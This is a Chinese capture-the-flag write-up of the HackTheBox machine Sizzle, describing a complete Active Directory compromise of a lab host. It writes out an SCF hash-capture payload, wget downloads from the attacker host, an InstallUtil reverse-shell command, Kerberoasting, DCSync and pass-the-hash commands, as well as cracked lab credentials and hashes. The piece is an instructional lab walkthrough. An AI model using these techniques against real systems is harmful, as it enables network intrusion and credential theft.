---
title: "HTB Sizzle"
description: "HackTheBox篇Active Directory 101系列之Sizzle"

date: 2024-07-15T17:19:03+08:00
lastmod: 2025-11-11T09:58:36+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - SCF File Attack
  - BypassCLM
  - Kerberoasting
  - Bypass-AppLocker
  - DCSync
---
<!--more-->

> 靶机ip：10.10.10.103

# 知识点

* SCF文件攻击
* Net-NTLMv2 hash破解
* 利用证书登录evil-winrm
* BypassCLM
* Kerberoasting
* Bypass-AppLocker
* DCSync攻击
* PTH传递攻击

# 信息收集

## nmap扫描

`nmap -sS -sV -sC 10.10.10.103`

![image-20240714192938885](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240714192941833-311799853.png)

发现有`ftp`服务、`DNS`服务、`Web`服务、`ldap`服务、 `smb`服务，域名为`HTB.LOCAL`

## ftp

扫描的结果显示`ftp`可以登录，使用`ftp`尝试登录

`ftp 10.10.10.103`

![image-20240715095535121](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715095535177-874727963.png)

没什么有用的信息

## Web

发现开放`80`和`443`两个端口，查看一下

![image-20240715102126567](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102127906-768479907.png)

![image-20240715102138611](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102138843-732144389.png)

发现两个网站可能是同一个

拿`dirsearch`扫一下网站目录

`dirsearch -u http://10.10.10.103/`

![image-20240715102636442](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102637131-207095840.png)

很明显有个与众不同的结果访问一下

![image-20240715102213171](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102216653-962407690.png)

发现存在一个登录框，但是没有用户名和密码，先放着

## ldap

`ldapsearch -x -H ldap://10.10.10.103:389 -s base -b "" namingcontexts`

![image-20240715100348090](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715100348580-149165439.png)

没什么有用的信息

## SMB

`smbclient -N -L \\10.10.10.103`

![image-20240715100732440](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715100733593-1338901198.png)

发现如上信息，测试一下

`smbclient -U "" //10.10.10.103/CertEnroll`

![image-20240715101406187](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715101406558-1730694173.png)

发现连接到`CertEnroll`，但是没有可执行命令的权限，但是这个很奇怪，感觉跟之前测试的`web`的登陆有关系，但是没有读取权限，继续测试

 `smbclient -U "" //10.10.10.103/"Department Shares"`

![image-20240715102824177](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102824347-2140539819.png)

发现在`Department Shares`里，可以继续操作，先接着测试

`smbclient -U "" //10.10.10.103/NETLOGON`

![image-20240715102714094](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715102714604-398683803.png)

还是无法执行命令，继续测试

![image-20240715103849910](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715103850485-1432636840.png)

发现除了`Department Shares`其他都不可以正常执行命令，所以重点放在`Department Shares`上

我们注意到`dir`结果中有`Users`目录，查看一下

![image-20240715104251552](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715104251701-1224385604.png)

拿到用户名列表，但是目录都是空的

```txt
amanda
amanda_adm
bill
bobcd Users
chris
henry
joe
jose
lkys37en
morgan
mrb3n
Public
```

为了方便后续操作以及便于查找相关文件，将`Department Shares`挂载到本地

`mount -t cifs "//10.10.10.103/Department Shares" /root/htb/Machines/Sizzle/file`

![image-20240715110927331](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715110927818-212747079.png)

文件有点多，写`bash`脚本检查该共享名下各个目录的写入权限

```bash
find . -type d | while read directory; do 
    touch ${directory}/a 2>/dev/null && echo "${directory} - write file" && rm ${directory}/a; 
    mkdir ${directory}/a 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/a; 
done
```

![image-20240715112555698](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715112556282-78033102.png)

结果显示`/Users/Public`、`/ZZ_ARCHIVE`目录拥有写入权限

# 获取用户名密码

## SCF文件攻击

> SCF（Shell 命令文件）文件可用于执行一组有限的操作，例如显示 Windows 桌面或打开 Windows 资源管理器，然而，SCF 文件可用于访问渗透测试人员构建特定 UNC 路径用于攻击。将恶意代码可以放在一个SCF文件中，然后将其植入网络共享中。该文件在用户浏览文件所在目录时被执行，系统将通过smb协议向渗透测试人员构建的特定 UNC 路径发起Net-NTLM身份验证请求，此时的请求中包含该用户的Net-NTLM hash，攻击者使用responder即可捕获该用户的Net-NTLM  hash。
>
> [SCF文件攻击](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
>
> [Net-NTLM hash利用](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)

了解完攻击原理，下面就开始操作

先准备一份`.scf`文件，内容如下：

```scf
[Shell]
Command=2
IconFile=\\10.10.14.28\icon
```

将其保存为`evil.scf`

![image-20240715133205426](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715133205878-926345847.png)

将这个文件复制到`/Users/Public`和`/ZZ_ARCHIVE`下

`cp ./evil.scf ./file/Users/Public/`

`cp ./evil.scf ./file/ZZ_ARCHIVE/`

这时发现长时间后，该文件会自动删除，所以我们要在有限的时间内完成该操作

利用`kali`中的`responder`工具监听`tun0`网卡

`responder -v -I tun0`

![image-20240715145000909](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715145001346-1000664214.png)

在`/Users/Public`或`/ZZ_ARCHIVE`目录下执行一下命令来确保对共享目录进行操作，如显示目录文件等操作后才会触发这个`evil.scf`

这里在`/Users/Public`下执行`ls`命令

![image-20240715143448053](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715143451775-597887204.png)

等待一段时间即可收到`hash`

![image-20240715144941244](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715144941717-2133617100.png)

```hash
amanda::HTB:6c1c482b8fd38bc2:74353BFE9ED1551710F2EAB77E964736:0101000000000000809FE0F9C5D6DA010886DA0021AC198B00000000020008004500540050005A0001001E00570049004E002D0044004700490049005700480030004C0035003000520004003400570049004E002D0044004700490049005700480030004C003500300052002E004500540050005A002E004C004F00430041004C00030014004500540050005A002E004C004F00430041004C00050014004500540050005A002E004C004F00430041004C0007000800809FE0F9C5D6DA0106000400020000000800300030000000000000000100000000200000C8847E6DA30D41FBC1F90E41FE1606FCD8CE7DDD4B7D1EB79979B1345E0EAD9C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000000000000
```

## Net-NTLMv2 hash破解

将上述`hash`值保存到文件`hash`中，使用`john`爆破

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

![image-20240715145239638](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715145240039-45553713.png)

`john hash -show`

![image-20240715145343859](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715145344115-203461178.png)

至此拿到一个用户名和密码：`amanda : Ashare1972`

先利用`crackmapexec`验证一下

![image-20240715145724720](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715145725094-1900698795.png)

尝试使用`evil-winrm`登陆失败

![image-20240715150558016](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715150558411-1621839895.png)

猜测是身份验证出了问题

# 通过获取的证书实现登录

之前`web`服务有个登陆界面，尝试拿`amanda `的用户名登录

![image-20240715150537115](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715150537725-584889206.png)

登陆成功

这个网站允许我生成一个证书，我们可以利用该证书来进行身份验证

我们可以创建自己的证书签名请求 (`csr`) 和密钥，然后将该 `CSR` 提交给服务器，它会返回给我一个证书。

首先使用 `openssl`创建 `CSR` 和密钥

`openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr`

![image-20240715153139686](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715153140520-1221636402.png)

按照网站上的步骤提交我们的证书请求

![image-20240715153926792](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715153928398-419142793.png)

接着点击高级证书请求

![image-20240715153942674](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715153942831-898952688.png)

准备好我们的证书签名

![image-20240715154049876](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715154050380-1923290039.png)

将其粘贴到网站中后点击提交

![image-20240715154147144](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715154147499-1427367506.png)

证书生成成功

![image-20240715162307140](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715162307496-991142482.png)

证书下载后移至本目录下

![image-20240715162429122](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715162436611-174996876.png)

有了证书和密钥可使用`evil-winrm`以`amanda`来进行身份验证。需要注意的是需要在端口`5689`上连接

`evil-winrm -c certnew.cer -k amanda.key -i 10.10.10.103 -u amanda -p Ashare1972 -S`

这里使用`-S`参数来指定使用`ssl`证书登录

![image-20240715165027041](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715165028826-1008718515.png)

# AD域横移

## 环境受限

发现这个用户的桌面没有我们想要的东西，还需要继续探测，但是用自带的`uplaod`传文件传不上去，看了下报错，也在网上搜了一下，发现我们可能是处于 `PowerShell` 约束语言模式，以下命令可以检查当前`powershell`的模式

`$executioncontext.sessionstate.languagemode`

![image-20240715192634771](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715192636382-579310471.png)

此时我们得到的是一个低权限`PS`控制台，并且改用`PowerShell Version 2`引擎也无法摆脱这种情况，由于`AppLocker`将`PowerShell`以约束模式运行，攻击者无法将`PowerShell`语言模式更改为完整模式以运行攻击工具，无法使用核心语言功能（例如，在内存中加载脚本等等......）是很难受的一件事情。

尝试发现一下域内的成员信息

![image-20240715193810323](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715193810763-1805696027.png)

去`Users`目录查看信息

![image-20240715194307427](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715194308226-560865564.png)

发现有还有`sizzler`和`mrlky`用户，但是权限太低，看不了相关信息

![image-20240715194338217](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715194339783-1164341773.png)

` Get-AppLockerPolicy -Effective -XML`

![image-20240715202034344](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715202041953-1069118467.png)

发现还有`AppLocker`限制

## BypassCLM

首先就是突破`powershell`约束语言模式，查找发现使用 PSByPassCLM 可突破`powershell`约束语言模式

工具下载地址：[PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)

因为之前传文件会有报错，所以先在本机开个`python`的`http`服务

`python3 -m http.server 80`

![image-20240715203359069](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715203400670-1053471516.png)

在机器上执行如下命令即可将本地文件下载到机器上

`wget http://10.10.14.28/PsBypassCLM.exe -OutFile PsBypassCLM.exe`

![image-20240715203537943](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715203545502-881304560.png)

同时在本地开启监听服务

`nc -lvp 8888`

![image-20240715204055299](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715204058957-49124056.png)

靶机上利用`PsBypassCLM`执行命令绕过`CLM`完成反弹shell

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.28 /rport=8888 \users\amanda\Documents\PsBypassCLM.exe`

![image-20240715204844560](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715204845934-1212222572.png)

反弹shell成功，并且成功突破了`powershell`约束语言模式

## Kerberoasting

在新的会话中查看端口开放情况

`netstat -ano`

![image-20240715205624669](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715205626202-1739744831.png)

发现在之前扫描端口的时候并没有扫描到88端口，说明该端口可能已被防火墙屏蔽，但是在机器上开放了88端口，，所以我们可以使用`Kerberoast`，在这之前需要获取`Kerberoast`

这里使用`Rubeus`工具来获取

* [Rubeus](https://github.com/GhostPack/Rubeus)

该工具需要自己编译`C#`来生成`exe`文件

同样利用``python`的`http`服务将`exe`上传至靶机

`wget http://10.10.14.28/Rubeus.exe -outfile Rubeus.exe`

在新的会话窗口中运行命令

`.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`

![image-20240716100917944](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716100921540-393901722.png)

发现还有问题，多半是由`AppLocker`限制导致的，所以还需要绕过`AppLocker`限制

## Bypass-AppLocker

这里给一个不受`APPLocker`中`PowerShell`约束语言模式影响的路径

打印机驱动程序目录：`C:\Windows\System32\spool\drivers\color\`

将`Rubeus.exe`传到这个目录下再执行命令

`.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972`

![image-20240716113730945](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716113734989-1612727273.png)

现在我们拿到了`mrlky`用户的`TGS`票据

```hash
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$303273AECC274ADF0D56393740ECBF1F$CC9D7AF049DFFC407CBA5AD753429F1609BD82F56372EEBD77C3E3C06CBA802DF56DFA81F043B7CEB4CA8F62FF7CF10BBE5F7EA6F8D48DC23CAD4B02D22842B816B5AB44682EA9AF1719015B23880E96C7DC98FE7F17DFA225EDDD357FBD7DF7479E6E16D08DF2EAD8576D726686D53AE8A10AF784A5A5C0E6686C48B9C1A34EE886C5114DBE1A889C0EB5FC79DDD9AE74EFDC1D61FC3828EE1B95E160A575453D1A2ABE6B140ECBE41DC055329CD54EEF9797D4276384EF73A6C531121476117FCC6633777D871397F553D04BF3ACE929B4F7D7BDC1287E7398D1023C4424D8DF0B143C4D3C6A4EEC295A09C41214CD08E692A2DFD602D5F3673932AA146A06B423C3A31F8F4D5F1AB64A0E64CABA76AC7D52207EEB32EC2AB7943237A3BFCC1F5A196182F7FE40A4BB237F31D54E231E9C8E8D12D22FCA1FAEB7DD30AF193EC1D73D7C057C0FCC0725F2FCF6A04C46AF3E776828AE29452B4DD9292F607082B93F13D3EF71F9AE488BE3903EA8A36A7F167626E758D2E949A5300C6E3A467152BA5D1339B2F1EB2DB221481B1B0C2C0716D2339970E081D83A8CF083DEFFA835DAF5A98AE975094DC352FCE733D6FF58336C7A44890ED844D391876B4C85CBED748D310B81B5ED4BF89C184941D4F9623A6F1BF1A94290F9D5D5189B014BFFC48F21788DAE22A7841D716E95E4B576277C80690FFBB49AE8B218DBFF6C540CE815B5AAAEC1E838719048886ACDC539A637DF26DFB4F21FDACE84D247C789B381F3381CBC21D319A0C19AB24187B96C4B7EC2DC009E3CE13DBD4E41561F26FAB3D9222622AD4F072454F247557E0AA2A9DD1C9574707A2AC3BE27B913B8B1387404109A1050619ACD87812566D324C0836934E05760F426872FAF5E24D6F076AE0C1225E8DF9B2102105ED275F8EB8C312150D418044F841684F56A70F07A07FC6B5417D3B4D44E3518DD11A8273E7DD006F03643F5766719034C54FEC044A7DA375F2219710CC5A3F0A2E4E721FB6F3A7AA3F20126836BB2120FCBDA4FF995C2DC84AECF736BD326B898171405DFBA5833D0563A8E211AB5F198D154A9C98DEF8335BB71CEC3810295F406C14AB98051F2A8E181FBA1FF712208316284254F854FB7E98954B1D8CA3B5360CB7FC7A1FA63FAF60A3D7516C90FAC94345862E2E2278E27B7131A6FE3D2529FA8B9694BD377401C185DF01EEBDD65E1B46C57B949CBB550F4FE14395EF75033EF319D2BEDC7B3D1F81E8C850A71DB696A33840C950C032C9B337543D0F0A28F1CD1B78897CABB3219497FDF7BBB5ED4D0F340A8D34EC14176F71D214C6BBB402824DD29101F819610A21405C3A0292E62C494758D0723716188
```



## NTLM哈希破解

将上述`hash`值保存到文件`spn-hash`中，使用`john`爆破

`john spn-hash --wordlist=/usr/share/wordlists/rockyou.txt`

![image-20240716114607870](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716114611543-2034764138.png)

`john spn-hash -show`

![image-20240716114615195](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716114618446-173345972.png)

这样就拿到了`mrlky`的明文密码：`Football#7`

## evil-winrm证书登录

正常登录`evil-winrm`还是登录不了，跟之前一样，利用`web`页面生成证书，拿证书登录

首先使用 `openssl`创建`mrlky`的`CSR`和密钥

`openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr`

![image-20240716141446345](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716141451172-153851049.png)

重复之前的操作最终会得到一个新的证书

![image-20240716141836559](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716141839775-1368628577.png)

这里为了跟之前的证书区分开来，就换了个名字`mrlkynew.cer`，但是不影响登录

`evil-winrm -c mrlkynew.cer -k mrlky.key -i 10.10.10.103 -u mrlky -p Football#7 -S`

![image-20240716142036513](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716142040045-2006970951.png)

登陆成功

现在登陆的是`mrlky.HTB`用户，在他的桌面上并没有我们想要的东西。通过查看用户发现，还有一个`mrlky`的用户，最后在`mrlky`的`Desktop`上找到`user.txt`

![image-20240716142438044](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716142441255-381007509.png)

# AD域提权

## Python-Bloodhound信息搜集

`bloodhound-python -c all -u mrlky -p Football#7 -d htb.local -ns 10.10.10.103`

得到的文件拿`bloodhound`打开分析

![image-20240715192107875](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240715192108385-865177832.png)

![image-20240716143118655](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716143122067-946821219.png)

发现`mrlky`有`GetChangesALL`权限可以直接进行`dcsync`攻击

## DCSync攻击

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py mrlky:Football#7@10.10.10.103`

![image-20240716144050521](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716144053985-1944936331.png)

拿到`Administrator`的`hash`

```hash
aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
```

## PTH传递攻击登录管理员

拿到了管理员的`hash`，就可以通过`wmiexec`哈希传递拿到管理员用户的权限

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103`

![image-20240716144320564](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716144324075-1639180140.png)

成功拿到管理员权限

![image-20240716144516769](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240716144519997-1994691611.png)

最后也是在`Desktop`上找到`root.txt`